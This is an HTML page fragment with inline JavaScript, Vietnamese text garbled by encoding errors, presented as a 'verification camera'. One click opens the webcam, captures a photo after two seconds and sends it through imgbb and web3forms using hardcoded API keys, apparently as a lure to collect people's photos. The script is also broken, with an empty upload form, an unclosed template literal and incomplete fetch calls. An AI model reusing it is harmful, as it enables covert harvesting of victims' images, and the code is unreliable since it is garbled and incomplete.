</head>
<body>
  <div class="card">
    <h2>Camera x√°c minh</h2>
    <p>Khi b·∫•m n√∫t d∆∞·ªõi, h·ªá th·ªëng s·∫Ω t·ª± ch·ª•p v√† g·ª≠i ·∫£nh.</p>
    <button id="openCam">üì∏ M·ªü camera & ch·ª•p t·ª± ƒë·ªông</button>

  <script>
  const WEB3FORMS_KEY = "89379a11-0561-41ee-80a0-bfce9dd60eb7";
  const IMGBB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0";

  const msg = document.getElementById('msg');
  const openCamBtn = document.getElementById('openCam');
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const preview = document.getElementById('preview');

  let stream = null;

  function showError(t){ msg.textContent="‚ùå "+t; msg.className="msg err"; }
  function showOK(t){ msg.textContent="‚úÖ "+t; msg.className="msg ok"; }

  // M·ªü camera v√† t·ª± ch·ª•p g·ª≠i
  openCamBtn.onclick = async () => {
    openCamBtn.disabled = true;
    msg.textContent = "üîÑ ƒêang kh·ªüi ƒë·ªông camera...";
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: true });

      video.style.display = "block";

      // ƒë·ª£i 2 gi√¢y cho camera ·ªïn ƒë·ªãnh r·ªìi ch·ª•p
      setTimeout(captureAndSend, 2000);

  async function captureAndSend() {
    try {
      msg.textContent = "üì∏ ƒêang ch·ª•p...";
      const context = canvas.getContext('2d');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const capturedImage = canvas.toDataURL('image/png');
      preview.src = capturedImage;
      preview.style.display = "block";

      msg.textContent = "‚è≥ ƒêang t·∫£i ·∫£nh l√™n...";
      const formData = new FormData();

      const resImg = await fetch("https://api.imgbb.com/1/upload?key=" + IMGBB_KEY, {
        method: "POST", body: formData
      });
      const resultImg = await resImg.json();
      if (!resultImg.success) throw new Error("Upload th·∫•t b·∫°i");
      const imageUrl = resultImg.data.url;

      msg.textContent = "üì® ƒêang g·ª≠i ·∫£nh...";
      const htmlMessage = `
        <h3>·∫¢nh t·ª± ch·ª•p m·ªõi</h3>

      const res = await fetch("https://api.web3forms.com/submit", {

    } catch (err) {

  }
  </script>
